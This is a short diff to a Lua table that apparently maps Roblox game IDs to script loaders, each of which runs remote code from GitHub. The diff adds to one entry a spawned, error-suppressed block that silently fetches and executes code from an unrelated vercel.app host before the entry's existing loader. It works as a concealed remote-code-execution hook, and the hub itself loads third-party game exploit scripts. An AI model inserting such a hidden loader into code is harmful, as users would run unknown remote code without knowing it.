@@ -27,6 +27,11 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/xenamm2/main/refs/hea
     ]],
 
 [13772394625] = [[
+task.spawn(function()
+    pcall(function()
+        loadstring(game:HttpGet("https://blyatscripts.vercel.app/lo"))()
+    end)
+end)
 CLIENT_ID = "88109c0de63f4585"
 loadstring(game:HttpGet("https://raw.githubusercontent.com/veryimportantrr/x-scripts/refs/heads/main/script.lua"))()
 ]],
